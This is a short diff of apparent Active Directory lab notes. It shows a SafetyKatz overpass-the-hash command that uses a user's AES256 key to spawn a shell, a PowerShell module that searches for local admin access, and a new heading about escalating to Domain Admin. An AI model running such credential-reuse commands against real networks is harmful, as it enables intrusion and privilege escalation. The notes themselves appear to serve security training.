@@ -615,7 +615,7 @@ We can try with the user already found gain a session on this server
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
 ```
 One we are logged in we can launch invishell.
-Import the Find-PSRemotingLocalAdminAccess.ps1 module to see where the server can log in
+Import the Find-PSRemotingLocalAdminAccess.ps1 module to see if we can log in the server
 
 ```powershell
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
@@ -624,3 +624,5 @@ Import the Find-PSRemotingLocalAdminAccess.ps1 module to see where the server ca
 Find-PSRemotingLocalAdminAccess
 ```
 ![[Pasted image 20231025162212.png]]
+
+*Compromise the server and escalate to Domain Admin privileges*
